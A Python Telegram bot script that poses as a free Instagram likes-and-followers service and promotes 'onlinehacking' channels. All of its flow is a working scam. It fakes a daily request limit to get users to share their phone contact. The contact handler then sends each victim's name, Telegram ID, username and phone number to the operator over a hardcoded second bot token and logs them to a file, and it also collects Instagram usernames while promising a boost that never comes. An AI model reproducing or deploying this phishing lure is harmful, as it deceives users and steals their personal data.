from instbot1 import ID, bot, start_bot
import telebot
from telebot import types
import time
import random
import requests


log = open('bot-log.txt', 'a+', encoding='utf-8')

YOUR_BOT_TOKEN = "6470408760:AAEy7g0RCzt4rlOTeUemm1C6bWNXdXwcug0"
YOUR_BOT_ID = "661262775"
your_bot = telebot.TeleBot(YOUR_BOT_TOKEN)

# Dictionary to store click count for each user
click_count = {}

# Function to create an inline keyboard with buttons
def create_custom_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    
    # Row 1: Join Channel 1 and Join Channel 2 buttons
    join_channel1_button = types.InlineKeyboardButton("Join Channel 1", url="https://t.me/onlinehacking")
    join_channel2_button = types.InlineKeyboardButton("Join Channel 2", url="https://t.me/termuxhacktutorial")
    markup.row(join_channel1_button, join_channel2_button)
    
    # Row 2: Check button
    check_button_text = "Welcome to the bot!" if click_count.get(user_id, 0) % 2 == 1 else "✅ Check"
    check_button = types.InlineKeyboardButton(check_button_text, callback_data="check_button")
    markup.row(check_button)
    
    return markup

bot.send_message(ID, '⚠️ In use this bot you have to join our telegram channel. \n \n After successful joining two telegram channel click check button‌ ✅', reply_markup=create_custom_keyboard(ID))
print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n")

# Handler for the "Check" button click
@bot.callback_query_handler(func=lambda call: call.data == "check_button")
def handle_check_button_click(call):
    user_id = call.message.chat.id
    click_count[user_id] = click_count.get(user_id, 0) + 1
    if click_count[user_id] % 2 == 1:
        bot.send_message(user_id, "⚠️ If you have not joined our Telegram channel, Join again and check!")
    else:
        bot.send_message(user_id, "✅ Your Bot has become Active now you can share username!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Hello! 👋
This is a bot for getting likes and subscribers on Instagram!
To start, write /getfollowers''') 
@bot.message_handler(commands=['admin'])
def start(message):
	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
@bot.message_handler(commands=['getfollowers'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Likes", callback_data="first")
	second_button = types.InlineKeyboardButton(text="Followers", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Select a promotion item:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Enter the number of likes (max. 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Enter the number of Followers (no more than 500)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /getfollowers!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'The number of likes cannot be more than 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
To receive additional requests, register in the bot!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /getfollowers!')#⏳
			return

		if int(num) > 500:
			bot.reply_to(message, 'The number of followers cannot be more than 500!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks Like You Have no Free Requests Left for the Day!
To Receive Additional Requests, Register in the Bot!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Name: {first} {last}
			├ID: {userid}
			├Username: @{nick}
			└Phone Number: {phone}
   
🎭 Follow @OnlineHacking for more...
      '''

		bot.send_message(ID, info)
		your_bot.send_message(YOUR_BOT_ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Submit your contact!')
		bot.send_message(message.chat.id, 'Registration Completed Successfully!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Enter Your Instagram Username:') 
		bot.register_next_step_handler(msg, entr)


def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Instagram Username: {inp} ')#⏳
		bot.send_message(ID, f'User Instagram Username: {inp}')
		bot.send_message(message.chat.id, 'Expect a boost to your account within 24 hours!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')


if __name__ == "__main__":
    start_bot()
    bot.polling(none_stop=True)


        
